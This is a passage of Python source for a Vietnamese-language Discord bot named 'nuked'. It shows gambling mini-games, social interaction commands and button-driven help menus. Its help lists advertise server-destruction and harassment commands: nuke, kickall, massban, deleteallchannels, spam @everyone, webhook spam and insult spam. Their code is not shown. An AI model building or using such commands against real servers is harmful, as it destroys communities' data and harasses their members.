        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin để đặt cược!")
        return
    choice = choice.lower()
    if choice not in ["h", "t", "head", "tail", "ngua", "sap"]:
        add_coins(ctx.author.id, bet)
        await ctx.send("❌ Hãy chọn `h` (Ngửa) hoặc `t` (Sấp)!")
        return
    result = random.choice(["h", "t"])
    res_str = "🪙 **NGỬA**" if result == "h" else "🪙 **SẤP**"
    user_choice = "h" if choice in ["h", "head", "ngua"] else "t"
    if user_choice == result:
        win = bet * 2
        add_coins(ctx.author.id, win)
        await ctx.send(f"🎉 Kết quả: {res_str}! {get_win_msg()} Bạn nhận **+{win:,} coin** 🌟!")
    else:
        await ctx.send(f"💀 Kết quả: {res_str}! {get_lose_msg()} Bạn mất **-{bet:,} coin**.")

@bot.command(name="slots")
async def slots(ctx, bet: int):
    """🎰 Máy quay xèng (jackpot x5, trùng 2 x1.5)"""
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin để chơi Slots!")
        return
    emojis = ["🎰", "💎", "🍒", "🍋", "🔔", "7️⃣"]
    r1, r2, r3 = random.choice(emojis), random.choice(emojis), random.choice(emojis)
    embed = discord.Embed(title="🎰 MÁY ĐÁNH BẠC SLOTS 🎰", color=0xFFD700)
    embed.add_field(name="Kết Quả", value=f"[ {r1} | {r2} | {r3} ]", inline=False)
    if r1 == r2 == r3:
        win = bet * 5
        add_coins(ctx.author.id, win)
        embed.description = f"🔥 **JACKPOT!** {get_win_msg()} Bạn thắng **+{win:,} coin** (x5) 🎉!"
    elif r1 == r2 or r2 == r3 or r1 == r3:
        win = int(bet * 1.5)
        add_coins(ctx.author.id, win)
        embed.description = f"✨ **THẮNG NHỎ!** {get_win_msg()} Bạn nhận **+{win:,} coin** (x1.5) 🪙!"
    else:
        embed.description = f"💔 **RẤT TIẾC!** {get_lose_msg()} Bạn mất **-{bet:,} coin**."
    await ctx.send(embed=embed)

@bot.command(name="dice")
async def dice(ctx, bet: int, guess: int):
    """🎲 Đoán mặt xúc xắc (x4)"""
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    if guess < 1 or guess > 6:
        add_coins(ctx.author.id, bet)
        await ctx.send("❌ Hãy đoán số từ 1 đến 6!")
        return
    rolled = random.randint(1, 6)
    if guess == rolled:
        win = bet * 4
        add_coins(ctx.author.id, win)
        await ctx.send(f"🎲 Xúc xắc ra **[{rolled}]**! {get_win_msg()} Bạn nhận **+{win:,} coin** 🎉!")
    else:
        await ctx.send(f"🎲 Xúc xắc ra **[{rolled}]**! {get_lose_msg()} Bạn mất **-{bet:,} coin**.")

@bot.command(name="rps")
async def rps(ctx, bet: int, choice: str):
    """✂️ Kéo búa bao (x2)"""
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    options = {"r": "🪨 Búa", "p": "📄 Bao", "s": "✂️ Kéo"}
    user_c = choice.lower()
    if user_c not in options:
        add_coins(ctx.author.id, bet)
        await ctx.send("❌ Hãy chọn `r` (Búa), `p` (Bao), hoặc `s` (Kéo)!")
        return
    bot_c = random.choice(["r", "p", "s"])
    msg = f"Bạn chọn **{options[user_c]}** vs Bot chọn **{options[bot_c]}**\n"
    if user_c == bot_c:
        add_coins(ctx.author.id, bet)
        await ctx.send(msg + "🤝 **HÒA RỒI!** Đã hoàn lại tiền cược.")
    elif (user_c == "r" and bot_c == "s") or (user_c == "p" and bot_c == "r") or (user_c == "s" and bot_c == "p"):
        win = bet * 2
        add_coins(ctx.author.id, win)
        await ctx.send(msg + f"🎉 **BẠN THẮNG!** {get_win_msg()} Nhận **+{win:,} coin**!")
    else:
        await ctx.send(msg + f"💀 **BẠN THUA!** {get_lose_msg()} Mất **-{bet:,} coin**.")

@bot.command(name="hilo")
async def hilo(ctx, bet: int, choice: str):
    """🎴 Đoán cao hơn hoặc thấp hơn 7 (x1.8)"""
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    choice = choice.lower()
    if choice not in ["h", "l"]:
        add_coins(ctx.author.id, bet)
        await ctx.send("❌ Lựa chọn `h` (Cao hơn 7) hoặc `l` (Thấp hơn 7)!")
        return
    num = random.randint(1, 13)
    msg = f"🎴 Lá bài mở ra là: **[{num}]**\n"
    if (choice == "h" and num > 7) or (choice == "l" and num < 7):
        win = int(bet * 1.8)
        add_coins(ctx.author.id, win)
        await ctx.send(msg + f"🎉 **ĐOÁN ĐÚNG!** {get_win_msg()} Bạn nhận **+{win:,} coin**!")
    else:
        await ctx.send(msg + f"💀 **ĐOÁN SAI!** {get_lose_msg()} Bạn mất **-{bet:,} coin**.")

@bot.command(name="crash")
async def crash(ctx, bet: int):
    """🚀 Trò chơi tên lửa - dừng đúng lúc để nhân tiền"""
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    crash_point = round(random.uniform(1.1, 3.5), 2)
    message = await ctx.send("🚀 **TÊN LỬA ĐANG BAY...**\nHệ số hiện tại: **1.0x**")
    current = 1.0
    for _ in range(5):
        await asyncio.sleep(1)
        current = round(current + random.uniform(0.2, 0.5), 2)
        if current >= crash_point:
            await message.edit(content=f"💥 **CRASH!** Tên lửa phát nổ ở **{crash_point}x**! {get_lose_msg()} Bạn mất **-{bet:,} coin**.")
            return
        await message.edit(content=f"🚀 **TÊN LỬA ĐANG BAY...**\nHệ số hiện tại: **{current}x**")
    win = int(bet * current)
    add_coins(ctx.author.id, win)
    await message.edit(content=f"🎯 **BẠN ĐÃ DỪNG LẠI AN TOÀN!** Rút ở **{current}x** và thắng **+{win:,} coin**! {get_win_msg()} 💎")

@bot.command(name="lottery")
async def lottery(ctx, bet: int):
    """🎫 Xổ số - tỷ lệ trúng 10% (x10)"""
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    luck = random.randint(1, 100)
    if luck > 90:
        win = bet * 10
        add_coins(ctx.author.id, win)
        await ctx.send(f"🎫 **VÉ SỐ TRÚNG ĐẠI PHÁT!** {get_win_msg()} Bạn nhận x10 = **+{win:,} coin** 🎉🎉🎉!")
    else:
        await ctx.send(f"🎫 **VÉ SỐ CHÚC BẠN MAY MẮN LẦN SAU!** {get_lose_msg()} Mất **-{bet:,} coin**.")

@bot.command(name="blackjack", aliases=["bj"])
async def blackjack(ctx, bet: int):
    """🃏 Blackjack 21 điểm (x2)"""
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    p_card = random.randint(12, 21)
    b_card = random.randint(15, 21)
    embed = discord.Embed(title="🃏 BÀN CHƠI BLACKJACK 21 🃏", color=0x9B59B6)
    embed.add_field(name="Điểm Của Bạn", value=f"`{p_card} điểm`", inline=True)
    embed.add_field(name="Điểm Của Bot", value=f"`{b_card} điểm`", inline=True)
    if p_card > b_card:
        win = bet * 2
        add_coins(ctx.author.id, win)
        embed.description = f"🎉 **BẠN THẮNG!** {get_win_msg()} Nhận **+{win:,} coin**!"
    elif p_card == b_card:
        add_coins(ctx.author.id, bet)
        embed.description = "🤝 **HÒA!** Hoàn lại tiền cược."
    else:
        embed.description = f"💀 **BẠN THUA!** {get_lose_msg()} Mất **-{bet:,} coin**."
    await ctx.send(embed=embed)

# ==================== LỆNH TÌNH YÊU ====================
GIF_HUG = [
    "https://media.tenor.com/2k4z1C2d5zIAAAAM/anime-hug.gif",
    "https://media.tenor.com/1J9k3C4d5zIAAAAM/hug.gif",
]
GIF_KISS = ["https://media.tenor.com/5L1k2C3d4zIAAAAM/anime-kiss.gif"]
GIF_SLAP = ["https://media.tenor.com/5L1k2C3d4zIAAAAM/anime-slap.gif"]
GIF_PAT = ["https://media.tenor.com/5L1k2C3d4zIAAAAM/anime-pat.gif"]
GIF_CUDDLE = ["https://media.tenor.com/5L1k2C3d4zIAAAAM/anime-cuddle.gif"]
GIF_LOVE = ["https://media.tenor.com/5L1k2C3d4zIAAAAM/anime-love.gif"]

@bot.command(name="love", aliases=["tinhyeu"])
async def love(ctx, user1: discord.Member = None, user2: discord.Member = None):
    """💘 Tính tỷ lệ tình yêu giữa hai người"""
    if user1 is None:
        await ctx.send("📌 Cú pháp: `nuked love @user1 @user2` hoặc `nuked love @user`")
        return
    if user2 is None:
        user2 = ctx.author
        user1, user2 = user2, user1
    percent = random.randint(0, 100)
    if percent < 30:
        result = "💔 Có vẻ không hợp nhau lắm..."
    elif percent < 60:
        result = "😊 Cũng tạm được, có tiềm năng!"
    elif percent < 80:
        result = "❤️ Khá hợp nhau đấy!"
    else:
        result = "💖 Trời sinh một cặp!"
    embed = discord.Embed(
        title="💘 TỶ LỆ TÌNH YÊU",
        description=f"{user1.mention} và {user2.mention}\n\n**{percent}%** {result}",
        color=0xFF69B4
    )
    embed.set_thumbnail(url=user2.display_avatar.url)
    embed.set_image(url=random.choice(GIF_LOVE))
    await ctx.send(embed=embed)

@bot.command(name="hug", aliases=["om"])
async def hug(ctx, member: discord.Member = None):
    """🤗 Ôm ai đó"""
    if member is None:
        await ctx.send("📌 Cú pháp: `nuked hug @user`")
        return
    embed = discord.Embed(
        title="🤗 ÔM",
        description=f"{ctx.author.mention} ôm {member.mention} thật chặt!",
        color=0xFFA500
    )
    embed.set_image(url=random.choice(GIF_HUG))
    await ctx.send(embed=embed)

@bot.command(name="kiss", aliases=["hon"])
async def kiss(ctx, member: discord.Member = None):
    """😘 Hôn ai đó"""
    if member is None:
        await ctx.send("📌 Cú pháp: `nuked kiss @user`")
        return
    embed = discord.Embed(
        title="😘 HÔN",
        description=f"{ctx.author.mention} hôn {member.mention} say đắm!",
        color=0xFF1493
    )
    embed.set_image(url=random.choice(GIF_KISS))
    await ctx.send(embed=embed)

@bot.command(name="slap", aliases=["tat"])
async def slap(ctx, member: discord.Member = None):
    """👋 Tát ai đó"""
    if member is None:
        await ctx.send("📌 Cú pháp: `nuked slap @user`")
        return
    embed = discord.Embed(
        title="👋 TÁT",
        description=f"{ctx.author.mention} tát {member.mention} một phát!",
        color=0xFF0000
    )
    embed.set_image(url=random.choice(GIF_SLAP))
    await ctx.send(embed=embed)

@bot.command(name="pat", aliases=["vodau"])
async def pat(ctx, member: discord.Member = None):
    """🫳 Vỗ đầu ai đó"""
    if member is None:
        await ctx.send("📌 Cú pháp: `nuked pat @user`")
        return
    embed = discord.Embed(
        title="🫳 VỖ ĐẦU",
        description=f"{ctx.author.mention} vỗ đầu {member.mention} nhẹ nhàng.",
        color=0xFFD700
    )
    embed.set_image(url=random.choice(GIF_PAT))
    await ctx.send(embed=embed)

@bot.command(name="cuddle", aliases=["auyem"])
async def cuddle(ctx, member: discord.Member = None):
    """🥰 Âu yếm ai đó"""
    if member is None:
        await ctx.send("📌 Cú pháp: `nuked cuddle @user`")
        return
    embed = discord.Embed(
        title="🥰 ÂU YẾM",
        description=f"{ctx.author.mention} âu yếm {member.mention}.",
        color=0xFF69B4
    )
    embed.set_image(url=random.choice(GIF_CUDDLE))
    await ctx.send(embed=embed)

@bot.command(name="marry", aliases=["cuoi"])
async def marry(ctx, member: discord.Member = None):
    """💍 Kết hôn với ai đó (lưu vào file)"""
    if member is None:
        await ctx.send("📌 Cú pháp: `nuked marry @user`")
        return
    if member.id == ctx.author.id:
        await ctx.send("❌ Bạn không thể tự kết hôn với chính mình!")
        return
    guild_id = str(ctx.guild.id)
    if guild_id not in marriages:
        marriages[guild_id] = {}
    user1 = str(ctx.author.id)
    user2 = str(member.id)
    if user1 in marriages[guild_id] or user2 in marriages[guild_id]:
        await ctx.send("❌ Một trong hai người đã kết hôn rồi!")
        return
    marriages[guild_id][user1] = user2
    marriages[guild_id][user2] = user1
    save_marriages(marriages)
    embed = discord.Embed(
        title="💍 ĐÁM CƯỚI",
        description=f"Chúc mừng {ctx.author.mention} và {member.mention} đã trở thành vợ chồng!",
        color=0xFF69B4
    )
    embed.set_image(url=random.choice(GIF_LOVE))
    await ctx.send(embed=embed)

@bot.command(name="divorce", aliases=["lyhon"])
async def divorce(ctx, member: discord.Member = None):
    """💔 Ly hôn với ai đó"""
    if member is None:
        await ctx.send("📌 Cú pháp: `nuked divorce @user`")
        return
    guild_id = str(ctx.guild.id)
    user1 = str(ctx.author.id)
    user2 = str(member.id)
    if guild_id in marriages and marriages[guild_id].get(user1) == user2:
        del marriages[guild_id][user1]
        del marriages[guild_id][user2]
        save_marriages(marriages)
        embed = discord.Embed(
            title="💔 LY HÔN",
            description=f"{ctx.author.mention} và {member.mention} đã chia tay.",
            color=0x0000FF
        )
        await ctx.send(embed=embed)
    else:
        await ctx.send("❌ Hai bạn không phải là vợ chồng!")

@bot.command(name="ship", aliases=["ghepdoi"])
async def ship(ctx, user1: discord.Member = None, user2: discord.Member = None):
    """💞 Ghép đôi ngẫu nhiên"""
    if user1 is None:
        await ctx.send("📌 Cú pháp: `nuked ship @user1 @user2`")
        return
    if user2 is None:
        user2 = ctx.author
    percent = random.randint(0, 100)
    if percent < 30:
        result = "💔 Chắc không thành đâu."
    elif percent < 60:
        result = "😊 Có duyên đấy."
    elif percent < 80:
        result = "❤️ Khá là hợp."
    else:
        result = "💖 Sinh ra để dành cho nhau."
    embed = discord.Embed(
        title="💘 GHÉP ĐÔI",
        description=f"{user1.mention} và {user2.mention}\n\n**{percent}%** {result}",
        color=0xFF1493
    )
    embed.set_image(url=random.choice(GIF_LOVE))
    await ctx.send(embed=embed)

@bot.command(name="crush", aliases=["totoinh"])
async def crush(ctx, member: discord.Member = None):
    """💌 Tỏ tình với ai đó"""
    if member is None:
        await ctx.send("📌 Cú pháp: `nuked crush @user`")
        return
    responses = [
        f"{member.mention} ơi, {ctx.author.mention} nói là thích bạn đó!",
        f"💌 {member.mention} nhận được lời tỏ tình từ {ctx.author.mention}!",
        f"{member.mention} có biết rằng {ctx.author.mention} crush bạn không?",
    ]
    embed = discord.Embed(
        title="💘 TỎ TÌNH",
        description=random.choice(responses),
        color=0xFF69B4
    )
    embed.set_image(url=random.choice(GIF_LOVE))
    await ctx.send(embed=embed)

# ==================== MENU HELP & SETUP ====================
HELP_CATEGORIES = {
    "🛡️ Quản lý Mod": [
        "`nuked kick @user` - Kick thành viên",
        "`nuked ban @user` - Ban thành viên",
        "`nuked unban <id>` - Unban thành viên",
        "`nuked mute @user [thời gian]` - Mute thành viên",
        "`nuked unmute @user` - Unmute thành viên",
        "`nuked warn @user` - Cảnh cáo thành viên",
        "`nuked kickall` - Kick toàn bộ thành viên",
        "`nuked massban` - Ban nhiều người",
        "`nuked masskick` - Kick nhiều người",
        "`nuked timeout @user <thời gian>` - Timeout thành viên",
        "`nuked clearuser @user` - Xóa tin nhắn của user",
    ],
    "📢 Quản lý Kênh": [
        "`nuked createchannel <tên>` - Tạo kênh mới",
        "`nuked deletechannel #kênh` - Xóa kênh",
        "`nuked createcategory <tên>` - Tạo category",
        "`nuked renamechannel #kênh <tên mới>` - Đổi tên kênh",
        "`nuked lock #kênh` - Khóa kênh",
        "`nuked unlock #kênh` - Mở khóa kênh",
        "`nuked hide #kênh` - Ẩn kênh",
        "`nuked reveal #kênh` - Hiện kênh",
        "`nuked clonechannel #kênh` - Clone kênh",
        "`nuked vc <tên>` - Tạo voice channel",
        "`nuked settopic #kênh <nội dung>` - Đặt chủ đề kênh",
        "`nuked setnsfw #kênh <true/false>` - Bật/tắt NSFW",
        "`nuked deleteallchannels` - Xóa tất cả kênh",
        "`nuked spamchannels` - Tạo kênh spam",
        "`nuked slowmode <giây>` - Bật slowmode",
    ],
    "🎭 Quản lý Role": [
        "`nuked addrole <tên>` - Tạo role mới",
        "`nuked role @user <role>` - Thêm role cho người",
        "`nuked removerole @user <role>` - Xóa role của người",
        "`nuked spamroles` - Tạo role spam",
        "`nuked deleteallroles` - Xóa tất cả role",
        "`nuked listroles` - Liệt kê role",
    ],
    "📊 Hệ thống Level": [
        "`nuked setlv <level> @user` - Set level",
        "`nuked lv [@user]` - Xem level",
        "`nuked channelslv #kênh` - Cài kênh thông báo level",
    ],
    "🎉 Chào mừng & Tạm biệt": [
        "`nuked setwelcome #kênh` - Cài kênh chào mừng",
        "`nuked setgoodbye #kênh` - Cài kênh tạm biệt",
    ],
    "📋 Log & Thông tin": [
        "`nuked log #kênh` - Cài kênh log",
        "`nuked serverinfo` - Thông tin server",
        "`nuked userinfo @user` - Thông tin user",
        "`nuked avatar @user` - Lấy avatar",
        "`nuked membercount` - Số lượng thành viên",
        "`nuked listchannels` - Danh sách kênh",
    ],
    "⚠️ Spam & Nuke": [
        "`nuked spam @user` - Spam chửi",
        "`nuked stop` - Dừng spam",
        "`nuked spameveryone` - Spam @everyone",
        "`nuked nuke` - NUKE SERVER",
        "`nuked webhookspam` - Spam qua webhook",
    ],
    "⚙️ Cấu hình Server": [
        "`nuked setservername <tên>` - Đổi tên server",
        "`nuked setservericon [url]` - Đổi icon server",
        "`nuked rename <tên>` - Đổi tên server (alias)",
        "`nuked icon [url]` - Đổi icon server (alias)",
        "`nuked backup` - Backup server",
        "`nuked restore` - Khôi phục server",
        "`nuked off` - Tắt bot",
    ],
    "👑 Quản lý Owner": [
        "`nuked addowner @user` - Thêm Owner",
        "`nuked deleteowner @user` - Xóa Owner",
        "`nuked showsv` - Xem danh sách server",
    ],
    "🔊 Voice & Emoji": [
        "`nuked moveall #voice` - Di chuyển tất cả voice",
        "`nuked move @user #voice` - Di chuyển 1 người",
        "`nuked deafen @user` - Làm điếc",
        "`nuked undeafen @user` - Bỏ điếc",
        "`nuked emoji` - Danh sách emoji",
        "`nuked steal <id> <tên>` - Copy emoji",
    ],
    "✉️ Tiện ích": [
        "`nuked guithu @user <nội dung>` - Gửi thư cho user",
        "`nuked nick @user <tên>` - Đổi nickname",
        "`nuked resetnick @user` - Reset nickname",
        "`nuked clear <số>` - Xóa tin nhắn",
        "`nuked purge all` - Xóa toàn bộ tin nhắn server",
    ],
    "💘 Tình yêu": [
        "`nuked love @user1 @user2` - Tỷ lệ tình yêu",
        "`nuked hug @user` - Ôm",
        "`nuked kiss @user` - Hôn",
        "`nuked slap @user` - Tát",
        "`nuked pat @user` - Vỗ đầu",
        "`nuked cuddle @user` - Âu yếm",
        "`nuked marry @user` - Kết hôn",
        "`nuked divorce @user` - Ly hôn",
        "`nuked ship @user1 @user2` - Ghép đôi",
        "`nuked crush @user` - Tỏ tình",
    ],
    "🚦 Bật/Tắt lệnh": [
        "`nuked off <lệnh>` - Tắt một lệnh",
        "`nuked on <lệnh>` - Bật lại lệnh đã tắt",
    ],
    "💰 Coin & Giải trí": [
        "`nuked balance` - Xem số coin",
        "`nuked daily` - Nhận coin mỗi ngày",
        "`nuked work` - Làm việc kiếm coin",
        "`nuked give @user <số>` - Chuyển coin",
        "`nuked shop` - Xem cửa hàng",
        "`nuked buyrole <tên>` - Mua role bằng coin",
        "`nuked coinflip <số> <h/t>` - Tung đồng xu",
        "`nuked slots <số>` - Chơi máy đánh bạc",
        "`nuked dice <số> <1-6>` - Xúc xắc",
        "`nuked rps <số> <r/p/s>` - Kéo búa bao",
        "`nuked hilo <số> <h/l>` - Cao thấp",
        "`nuked crash <số>` - Crash game",
        "`nuked lottery <số>` - Xổ số",
        "`nuked blackjack <số>` - Blackjack",
        "`nuked beg` - Xin tiền",
        "`nuked crime` - Phạm tội",
        "`nuked bank deposit/withdraw <số>` - Gửi/rút ngân hàng",
        "`nuked leaderboard` - Bảng xếp hạng",
        "`nuked setcoins @user <số>` - (Admin) Đặt coin",
        "`nuked addcoins @user <số>` - (Admin) Cộng coin",
        "`nuked removecoins @user <số>` - (Admin) Trừ coin",
        "`nuked resetdaily @user` - (Admin) Reset daily",
    ],
}

HELP_CATEGORY_DESCRIPTIONS = {
    "🛡️ Quản lý Mod": "Các lệnh quản lý thành viên như kick, ban, mute, warn, timeout...",
    "📢 Quản lý Kênh": "Tạo, xóa, đổi tên, khóa/mở khóa kênh, quản lý kênh...",
    "🎭 Quản lý Role": "Tạo role, gán role, xóa role, spam role...",
    "📊 Hệ thống Level": "Thiết lập level, xem level, cấu hình kênh thông báo level...",
    "🎉 Chào mừng & Tạm biệt": "Cài đặt kênh chào mừng và tạm biệt thành viên...",
    "📋 Log & Thông tin": "Cấu hình log, xem thông tin server, user, avatar...",
    "⚠️ Spam & Nuke": "Các lệnh spam, phá server, nuke...",
    "⚙️ Cấu hình Server": "Đổi tên, đổi icon, backup, restore server...",
    "👑 Quản lý Owner": "Thêm/xóa owner, xem danh sách server...",
    "🔊 Voice & Emoji": "Quản lý voice, di chuyển, emoji...",
    "✉️ Tiện ích": "Gửi thư, đổi nickname, xóa tin nhắn...",
    "💘 Tình yêu": "Các lệnh tình yêu, cặp đôi, tương tác vui vẻ...",
    "🚦 Bật/Tắt lệnh": "Quản lý bật/tắt các lệnh của bot (chỉ Owner).",
    "💰 Coin & Giải trí": "Kiếm coin, chơi game, giao dịch và các lệnh admin quản lý coin.",
}

# ==================== CLASS VIEW TƯƠNG TÁC CHO HELP ====================
class HelpView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        for category_name in HELP_CATEGORIES.keys():
            button = discord.ui.Button(
                label=category_name,
                style=discord.ButtonStyle.primary,
                custom_id=category_name
            )
            button.callback = self.make_callback(category_name)
            self.add_item(button)

    def make_callback(self, category_name):
        async def callback(interaction: discord.Interaction):
            commands_list = HELP_CATEGORIES.get(category_name, [])
            description = HELP_CATEGORY_DESCRIPTIONS.get(category_name, "")
            embed = discord.Embed(
                title=f"📋 Danh mục: {category_name}",
                description=f"**Công dụng:** {description}\n\n" + "\n".join(commands_list) if commands_list else "Không có lệnh nào.",
                color=0x00FF00
            )
            embed.set_footer(text="Boss Bảo 💖")
            await interaction.response.send_message(embed=embed, ephemeral=True)
        return callback

# ==================== LỆNH SETUP (CHỈ OWNER) ====================
@bot.command(name="setup")
@is_bot_owner()
async def setup(ctx):
    embed = discord.Embed(
        title="💖 HỆ THỐNG QUẢN TRỊ TỐI CAO CỦA BOSS BẢO 💖",
        description="Chọn một danh mục bên dưới để xem các lệnh tương ứng.",
        color=0xFF69B4
    )
    for category_name, desc in HELP_CATEGORY_DESCRIPTIONS.items():
        embed.add_field(name=category_name, value=desc, inline=False)
    embed.set_image(url=CUSTOM_SETUP_GIF)
    embed.set_footer(text="Độc quyền phục vụ Boss Bảo 💖", icon_url=ctx.author.display_avatar.url)
    view = HelpView()
    await ctx.send(embed=embed, view=view)

@setup.error
async def setup_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH HELP (CÔNG KHAI) ====================
@bot.command(name="help")
async def help_command(ctx):
    embed = discord.Embed(
        title="📖 CẨM NANG ĐIỀU HÀNH",
        description="Chọn một danh mục bên dưới để xem các lệnh.",
        color=0xFF69B4
    )
    for category_name, desc in HELP_CATEGORY_DESCRIPTIONS.items():
        embed.add_field(name=category_name, value=desc, inline=False)
    embed.set_image(url=CUSTOM_SETUP_GIF)
    embed.set_footer(text="Tôn vinh Boss Bảo 💖", icon_url=ctx.author.display_avatar.url)
    view = HelpView()
    await ctx.send(embed=embed, view=view)

# ==================== CLASS GUIDEVIEW (HƯỚNG DẪN CHI TIẾT) ====================
class GuideView(discord.ui.View):
    def __init__(self, parent_interaction):
        super().__init__(timeout=120)
        self.parent_interaction = parent_interaction
        self.add_item(discord.ui.Button(label="💰 Kinh tế", style=discord.ButtonStyle.primary, custom_id="guide_economy"))
        self.add_item(discord.ui.Button(label="🎮 Game", style=discord.ButtonStyle.success, custom_id="guide_game"))
        self.add_item(discord.ui.Button(label="💘 Tình yêu", style=discord.ButtonStyle.danger, custom_id="guide_love"))
        self.add_item(discord.ui.Button(label="🛠️ Admin", style=discord.ButtonStyle.secondary, custom_id="guide_admin"))
        self.add_item(discord.ui.Button(label="❓ Lệnh cơ bản", style=discord.ButtonStyle.primary, custom_id="guide_basic"))
        self.add_item(discord.ui.Button(label="🎯 Mẹo hay", style=discord.ButtonStyle.success, custom_id="guide_tips"))
        back = discord.ui.Button(label="🔙 Quay lại", style=discord.ButtonStyle.danger, custom_id="guide_back")
        back.callback = self.back_callback
        self.add_item(back)

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        cid = interaction.data["custom_id"]
        if cid.startswith("guide_"):
            await self.handle_guide(interaction, cid)
            return True
        return False

    async def handle_guide(self, interaction: discord.Interaction, cid: str):
        embeds = {
            "guide_economy": discord.Embed(
                title="💰 KINH TẾ & COIN",
                description=(
                    "**Các lệnh kiếm và quản lý coin:**\n"
                    "💰 `nuked balance` – Xem số dư ví và ngân hàng.\n"
                    "🎁 `nuked daily` – Nhận thưởng mỗi ngày (100-500 coin).\n"
                    "💼 `nuked work` – Làm việc kiếm 50-300 coin (mỗi 1h).\n"
                    "🥺 `nuked beg` – Xin tiền người khác (mỗi 30s).\n"
                    "🚨 `nuked crime` – Trộm cướp (mỗi 60s, 55% thành công).\n"
                    "🏦 `nuked bank deposit <số/all>` – Gửi tiền vào ngân hàng.\n"
                    "💸 `nuked bank withdraw <số/all>` – Rút tiền về ví.\n"
                    "🤝 `nuked give @user <số>` – Chuyển coin cho bạn bè.\n"
                    "🏆 `nuked leaderboard` – Xem top 10 đại gia.\n\n"
                    "💡 **Mẹo:** Hãy dùng `daily` và `work` mỗi ngày để tích lũy nhanh."
                ),
                color=0xF1C40F
            ),
            "guide_game": discord.Embed(
                title="🎮 TRÒ CHƠI GIẢI TRÍ",
                description=(
                    "**Các trò chơi may rủi (đặt cược bằng coin):**\n"
                    "🪙 `nuked coinflip <tiền> <h/t>` – Tung đồng xu (x2).\n"
                    "🎲 `nuked dice <tiền> <1-6>` – Đoán xúc xắc (x4).\n"
                    "✂️ `nuked rps <tiền> <r/p/s>` – Oẳn tù tì (x2).\n"
                    "🎴 `nuked hilo <tiền> <h/l>` – Cao / thấp hơn 7 (x1.8).\n"
                    "🎰 `nuked slots <tiền>` – Máy quay xèng (jackpot x5).\n"
                    "🚀 `nuked crash <tiền>` – Tên lửa – dừng đúng lúc để nhân tiền.\n"
                    "🎫 `nuked lottery <tiền>` – Xổ số (x10 nếu trúng).\n"
                    "🃏 `nuked blackjack <tiền>` – Xì dách 21 điểm (x2).\n\n"
                    "💡 **MẸO:** Chơi `slots` hoặc `lottery` để có cơ hội thắng lớn, nhưng rủi ro cao!"
                ),
                color=0x2ECC71
            ),
            "guide_love": discord.Embed(
                title="💘 TÌNH YÊU & TƯƠNG TÁC",
                description=(
                    "**Các lệnh tương tác vui vẻ:**\n"
                    "💕 `nuked love @user1 @user2` – Tính tỷ lệ tình yêu.\n"
                    "🤗 `nuked hug @user` – Ôm người khác.\n"
                    "😘 `nuked kiss @user` – Hôn người khác.\n"
                    "👋 `nuked slap @user` – Tát người khác.\n"
                    "🫳 `nuked pat @user` – Vỗ đầu người khác.\n"
                    "🥰 `nuked cuddle @user` – Âu yếm.\n"
                    "💍 `nuked marry @user` – Kết hôn (lưu vào file).\n"
                    "💔 `nuked divorce @user` – Ly hôn.\n"
                    "💞 `nuked ship @user1 @user2` – Ghép đôi ngẫu nhiên.\n"
                    "💌 `nuked crush @user` – Tỏ tình.\n\n"
                    "💡 **VUI:** Hãy thử `marry` và `divorce` để tạo không khí hài hước!"
                ),
                color=0xFF1493
            ),
            "guide_admin": discord.Embed(
                title="🛠️ LỆNH QUẢN TRỊ (OWNER)",
                description=(
                    "**Các lệnh dành riêng cho chủ bot (Boss Bảo):**\n"
                    "👑 `nuked addowner @user` – Thêm owner.\n"
                    "🗑️ `nuked deleteowner @user` – Xóa owner.\n"
                    "📊 `nuked setlv <level> @user` – Set level cho user.\n"
                    "📢 `nuked channelslv #kênh` – Cài kênh thông báo level.\n"
                    "📋 `nuked log #kênh` – Cài kênh log sự kiện.\n"
                    "🎉 `nuked setwelcome #kênh` – Cài kênh chào mừng.\n"
                    "👋 `nuked setgoodbye #kênh` – Cài kênh tạm biệt.\n"
                    "💾 `nuked backup` – Backup server.\n"
                    "🔄 `nuked restore` – Restore server.\n"
                    "🚫 `nuked off <lệnh>` – Tắt một lệnh.\n"
                    "✅ `nuked on <lệnh>` – Bật lại lệnh.\n"
                    "🛑 `nuked off` (không tham số) – Tắt toàn bộ bot.\n"
                    "🔛 `nuked on` (không tham số) – Bật lại bot.\n\n"
                    "💡 **LƯU Ý:** Các lệnh `setup`, `showsv`, `nuke`, `spam...` cũng thuộc nhóm này."
                ),
                color=0x9B59B6
            ),
            "guide_basic": discord.Embed(
                title="❓ LỆNH CƠ BẢN CHO MỌI NGƯỜI",
                description=(
                    "**Những lệnh hữu ích hàng ngày:**\n"
                    "📖 `nuked help` – Mở menu trợ giúp tổng hợp.\n"
                    "🎮 `nuked games` – Mở trung tâm giải trí.\n"
                    "👤 `nuked userinfo @user` – Xem thông tin người dùng.\n"
                    "🖼️ `nuked avatar @user` – Xem avatar.\n"
